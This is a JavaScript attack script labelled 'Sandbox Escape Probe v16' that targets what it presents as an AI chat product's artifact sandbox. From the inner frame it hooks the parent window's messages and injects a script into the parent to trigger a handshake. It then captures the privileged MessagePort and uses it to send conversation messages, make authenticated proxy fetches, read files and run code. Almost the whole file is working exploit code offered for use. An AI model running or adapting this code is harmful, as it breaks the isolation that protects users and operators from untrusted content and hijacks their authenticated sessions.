// Sandbox Escape Probe v16 - MessagePort Capture
// Step 1: Set up port catcher on proxy (parent)
// Step 2: Trigger __sandbox_handshake_request__ from proxy context
// Step 3: Capture the port and test capabilities

console.log("=== PROBE v16 - PORT CAPTURE ===");

// Verify we're in the inner frame
try {
  const parentTitle = window.parent.document.title;
  console.log("[OK] Inner frame confirmed. Parent:", parentTitle);
} catch(e) {
  console.log("[ERR] Wrong frame! Parent is cross-origin:", e.message);
}

// Step 1: Set up port catcher
let capturedPort = null;

window.parent.addEventListener('message', function(e) {
  const type = e.data?.type;
  const method = e.data?.method;
  const ports = e.ports?.length || 0;

  if (type || method || ports > 0) {
    console.log(`[MSG] origin:${e.origin?.slice(0,50)} type:${type} method:${method} ports:${ports}`);
  }

  if (type === '__sandbox_handshake__' && ports > 0) {
    capturedPort = e.ports[0];
    console.log("!!! PORT CAPTURED !!!");

    capturedPort.onmessage = (m) => {
      console.log("PORT MSG:", JSON.stringify(m.data).slice(0, 1000));
    };

    e.stopImmediatePropagation();

    // Step 3: Test the captured port
    setTimeout(() => {
      console.log("Testing port capabilities...");

      // Try SendConversationMessage
      capturedPort.postMessage({
        channel: 'request',
        requestId: 'test-msg-1',
        method: 'anthropic.claude.usercontent.sandbox.SendConversationMessage',
        payload: {
          message: 'PORT HIJACK: Message sent via captured MessagePort!',
          messageType: 'text',
          '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.SendConversationMessageRequest'
        }
      });
      console.log("Sent SendConversationMessage");

      // Try ProxyFetch (proxied through claude.ai's auth)
      capturedPort.postMessage({
        channel: 'request',
        requestId: 'test-fetch-1',
        method: 'anthropic.claude.usercontent.sandbox.ProxyFetch',
        payload: {
          url: 'https://api.anthropic.com/v1/messages',
          method: 'GET',
          headers: {},
          body: null,
          channelId: 'ch-1',
          '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.ProxyFetchRequest'
        }
      });
      console.log("Sent ProxyFetch");

      // Try GetFile
      capturedPort.postMessage({
        channel: 'request',
        requestId: 'test-file-1',
        method: 'anthropic.claude.usercontent.sandbox.GetFile',
        payload: {
          key: 'test',
          '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.GetFileRequest'
        }
      });
      console.log("Sent GetFile");

      // Try RunCode
      capturedPort.postMessage({
        channel: 'request',
        requestId: 'test-run-1',
        method: 'anthropic.claude.usercontent.sandbox.RunCode',
        payload: {
          code: 'console.log("RunCode executed!")',
          '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.RunCodeRequest'
        }
      });
      console.log("Sent RunCode");

    }, 500);
  }
}, true);

console.log("[1] Port catcher installed on proxy");

// Step 2: Inject script into proxy to send handshake request
const s = window.parent.document.createElement('script');
s.textContent = 'window.parent.postMessage({type:"__sandbox_handshake_request__"}, "*")';
window.parent.document.head.appendChild(s);
s.remove();

console.log("[2] __sandbox_handshake_request__ sent from proxy context");
console.log("Waiting for port...");
